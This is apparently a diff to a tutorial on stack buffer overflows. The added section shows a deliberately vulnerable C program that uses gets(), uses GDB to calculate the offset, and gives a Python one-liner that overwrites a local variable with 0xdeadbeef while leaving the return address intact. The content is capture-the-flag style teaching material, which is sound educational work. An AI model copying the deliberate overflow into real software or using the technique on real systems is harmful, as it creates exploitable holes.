@@ -72,6 +72,7 @@ Here are two cases:
 Also, note that after getting the flag there's `segmentation fault`. This means that the program can't figure out where to return to `basically EIP is corrupted due to corrupted stack`. So, it just crashed and showed this error.
 
 # Using GDB
+
 I have installed [pwndbg](https://github.com/pwndbg/pwndbg). It makes things easier.
 Now lets run the binary in GDB.
 ```
@@ -82,6 +83,7 @@ Next we view all functions present in binary using
 info functions
 ```
 ![alt text](../images/info_functions.png)
+---
 The interesting functions are `vuln` and `win`
 Lets add a breakpoint on `vuln` function and run the binary.
 ```
@@ -150,3 +152,91 @@ This means that
 - when sending 56 bytes, the program crashed.
 
 We will look into return stuff more in detail when we hijack the return using overflow.
+
+# Keeping the return Intact
+In the previous example we got the flag after we overflowed the buffer but we also crashed the program.
+
+In some cases, we must `control the Overflow` to keep the return value intact, while just changing the value of desired variable in the stack. In this way, the program will not crash and will proceed to run with the changed variable value.
+
+Here's the modified C code
+
+```C
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+
+void win() {
+    printf("You changed the variable value! Now if the return address is intact, you will get the flag!\n");
+}
+
+void vuln() {
+    char buffer[40];
+    int check = 0;
+
+    printf("Enter your input: ");
+    gets(buffer);  // 🔥 vulnerable to overflow
+
+    if (check != 0xdeadbeef) {
+        printf("❌ Try again! check = 0x%x\n", check);
+        exit(1);
+    } else {
+        win();
+    }
+}
+
+int main() {
+    vuln();
+
+    // Only reached if return address was not corrupted
+    printf("✅ Here's the flag: Flag{return_intact_value_changed_overflow}\n");
+    return 0;
+}
+```
+
+In this code, if the return address is corrupted (due to an overly long payload), the program will crash or not reach main() — so the final flag line won't print.
+
+We want to build an exploit that:
+
+    Overflows buffer
+
+    Overwrites check to 0xdeadbeef
+
+    Does not touch the return address
+
+That means we need to calculate the offset to check and stop there.
+
+First we compile the program by following the [compile](#compile) section.
+
+## Calculations
+By examining the binary in GDB we discovered that 44 bytes are required to overflow the buffer and then we send the desired value of check variable in little endian format.
+
+![vuln function](../images/var_change_vuln.png)
+
+We can see that
+1. rsp is subtracted by `0x30`
+2. This means theres a space of `0x30` or `48` bytes created on stack for this function.
+3. Value of previous rsp is saved in `rbp`
+4. After sub, `rsp` points to `rbp-0x30`
+5. The variable is probably (it is, we know from code) at `rbp-0x4` 
+
+The `gets` function in line `+51` is called with following parameter (it takes one parameter only)
+- `rdi = [rbp - 0x30]`, this is the first parameter (pointer to the variable) 
+- `mov eax, 0x0` is for clearing the eax to store the return from gets call.
+
+Hence we know that the buffer starts from `rbp-0x30` and we have to go upto `rbp-0x4` where our check variable is stored. 
+
+So, we need `0x30 - 0x4 = 0x2c = 44 bytes` to reach over desired variable and then `0xdeadbeef` in little endian format to pass the check!
+
+## Payload
+By sending this payload, we get the flag
+
+```python
+python3 -c "import sys; sys.stdout.buffer.write(b'A'*44 + b'\xef\xbe\xad\xde')" | ./variable_change_return_intact
+```
+
+what is this payload doing?
+- 44 A bytes
+- deadbeef in little endian
+- sending it as input to the binary
+
+And we got the flag! keeping the return value intact!
